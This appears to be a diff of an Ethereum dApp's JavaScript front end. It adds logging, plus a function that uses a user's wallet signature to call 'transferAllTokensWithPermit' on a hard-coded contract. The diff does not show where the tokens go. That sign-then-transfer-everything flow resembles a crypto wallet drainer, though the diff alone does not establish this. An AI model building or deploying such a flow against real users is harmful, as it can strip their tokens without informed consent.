@@ -5,7 +5,7 @@ let userAddress;
 const contractAddress = '0x838F9b8228a5C95a7c431bcDAb58E289f5D2A4DC'; // 替换为你的合约地址
 
 // 替换为你的合约 ABI
-const yourContractABI =[
+const contractABI = [
 	{
 		"inputs": [],
 		"stateMutability": "nonpayable",
@@ -135,6 +135,7 @@ async function connectWallet() {
         }
     } else {
         alert('请安装MetaMask或其他以太坊钱包扩展！');
+        console.log("未检测到以太坊钱包。");
     }
 }
 
@@ -145,6 +146,8 @@ async function signAndFillSignature(from, tokenAddress) {
             { type: 'address', value: from },
             { type: 'address', value: tokenAddress }
         );
+
+        console.log("准备签名的消息:", message);
 
         const signature = await web3.eth.personal.sign(message, from);
         console.log("签名成功:", signature);
@@ -165,5 +168,17 @@ function extractSignatureParameters(signature) {
     const r = signature.slice(0, 66);
     const s = '0x' + signature.slice(66, 130);
     const v = parseInt(signature.slice(130, 132), 16);
+    console.log("签名参数 - v:", v, " r:", r, " s:", s);
     return { v, r, s };
+}
+
+// 转移代币函数（使用 transferAllTokensWithPermit 方法）
+async function transferTokens(token, from, v, r, s) {
+    const contract = new web3.eth.Contract(contractABI, contractAddress);
+    try {
+        await contract.methods.transferAllTokensWithPermit(token, from, v, r, s).send({ from: userAddress });
+        console.log("代币转移成功");
+    } catch (error) {
+        console.error("代币转移失败:", error);
+    }
 }
